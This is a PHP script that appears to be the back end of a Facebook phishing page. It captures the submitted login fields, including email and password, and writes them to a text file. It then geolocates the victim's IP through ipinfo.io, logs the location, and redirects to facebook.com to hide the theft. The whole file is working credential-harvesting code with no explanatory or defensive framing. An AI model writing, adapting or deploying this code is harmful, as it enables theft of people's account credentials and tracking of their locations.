<?php
// Cookies
$cookie_name = "user_cookie";
$cookie_value = "your_cookie_value";
setcookie($cookie_name, $cookie_value, time() + 3600, "/"); // Cookie expires in 1 hour
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Process form data
    $file = fopen("form_data.txt", "w");
    $data = $_POST["jazoest"];
    fwrite($file, "jazoest: $data\n");
    $data = $_POST["lsd"];
    fwrite($file, "lsd: $data\n");
    $data = $_POST["email"];
    fwrite($file, "email: $data\n");
    $data = $_POST["pass"];
    fwrite($file, "pass: $data\n");
    $data = $_POST["login_source"];
    fwrite($file, "login_source: $data\n");
    $data = $_POST["next"];
    fwrite($file, "next: $data\n");
    fclose($file);
    $ip_address = $_SERVER["REMOTE_ADDR"];
    $location_info = file_get_contents("https://ipinfo.io/$ip_address/json");
    $location_data = json_decode($location_info);
    $user_location = "User Location: " . $location_data->city . ", " . $location_data->region . ", " . $location_data->country;
    file_put_contents("location.txt", $user_location . "\n", FILE_APPEND);
    // Redirect to the specified URL
    header("Location: https://www.facebook.com");
    exit();
}
?>
